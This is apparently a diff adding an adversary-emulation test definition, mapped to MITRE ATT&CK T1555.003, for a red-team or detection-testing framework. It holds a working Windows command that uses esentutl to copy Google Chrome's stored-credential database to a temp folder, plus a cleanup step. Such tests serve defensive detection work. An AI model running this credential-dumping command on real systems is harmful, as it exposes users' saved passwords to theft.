@@ -1,0 +1,20 @@
+---
+- id: 95787489ec59887221ad6181fb76351c
+  name: Dump Chrome Login Data with esentutl
+  description: 'This test simulates an adversary using esentutl to dump encrypted
+    credentials from Google Chrome''s Login database.
+
+    [Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
+  platforms:
+    windows:
+      cmd:
+        command: esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login
+          Data" /d "%temp%\T1555.003_Login_Data.tmp"
+        payloads: []
+        cleanup: del /f /q %temp%\T1555.003_Login_Data.tmp > nul 2>&1
